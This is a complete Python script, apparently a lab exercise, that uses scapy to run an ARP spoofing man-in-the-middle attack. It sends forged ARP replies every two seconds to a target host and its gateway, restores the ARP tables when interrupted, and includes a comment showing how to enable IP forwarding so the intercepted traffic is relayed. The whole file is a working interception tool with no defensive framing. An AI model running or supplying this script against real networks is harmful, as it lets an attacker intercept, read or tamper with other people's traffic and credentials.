#!/usr/bin/env python
import scapy.all as scapy
import time
import sys


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)  # arp packet object
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # set the destination mac to the broadcast mac
    arp_request_broadcast = broadcast/arp_request
    # arp_request_broadcast.show()
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    # create an arp packet response (op=2) to the target windows machine
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(target_ip, source_ip):
    target_mac = get_mac(target_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)
    # trimitem packet de 4 ori pentru a ne asigura ca tabelele arp sunt aduse la valoarea default


packets_send = 0
target_ip = "10.0.2.9"
gateway_ip = "10.0.2.1"
try:
    while True:
        spoof(target_ip, gateway_ip)  # spoofing target
        spoof(gateway_ip, target_ip)  # spoofing router
        packets_send += 2
        print("\r[+] Packets send: " + str(packets_send), end="")
        # print("\r[+] Packets send: " + str(packets_send)),
        # sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C ....... Resetting ARP tables ...... Please wait.")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)

# echo 1 > /proc/sys/net/ipv4/ip_forward  <- enable request from target to go to the router
